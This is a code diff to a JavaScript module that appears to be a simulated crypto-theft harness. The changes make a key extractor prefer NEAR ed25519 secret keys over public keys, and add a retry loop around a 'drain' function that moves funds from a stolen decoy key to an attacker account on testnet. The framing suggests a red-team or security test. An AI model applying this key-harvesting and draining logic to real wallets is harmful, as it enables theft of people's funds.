@@ -7,7 +7,9 @@ import { REPO } from './sandbox.mjs';
 const KEY_RE = /ed25519:[1-9A-HJ-NP-Za-km-z]{40,100}/g;
 
 export function extractKeys(text) {
-  return [...new Set(String(text).match(KEY_RE) || [])];
+  const all = [...new Set(String(text).match(KEY_RE) || [])];
+  const secrets = all.filter((k) => k.length >= 80); // 64-byte secret keys; public keys are ~52 chars
+  return secrets.length ? secrets : all;
 }
 
 export function startListener(onLoot) {
@@ -46,7 +48,17 @@ async function core() {
 }
 
 /** Use a stolen decoy key: move `amountNear` out of the decoy account to the attacker account (testnet). */
-export async function drain(secretKey, { amountNear = 0.1, fromAccount, all = false } = {}) {
+export async function drain(secretKey, opts = {}) {
+  let r;
+  for (let i = 0; i < 5; i++) { // public RPC rate-limits (HTTP 429): the thief is persistent
+    r = await drainOnce(secretKey, opts);
+    if (r.ok || r.skipped || !/429|Exceeded \d+ providers|timeout/i.test(r.error || '')) break;
+    await new Promise((s) => setTimeout(s, 1500 * (i + 1)));
+  }
+  return r;
+}
+
+async function drainOnce(secretKey, { amountNear = 0.1, fromAccount, all = false } = {}) {
   if (process.env.STANDIN_CHAIN === 'off') return { ok: false, skipped: 'STANDIN_CHAIN=off' };
   const t0 = Date.now();
   try {
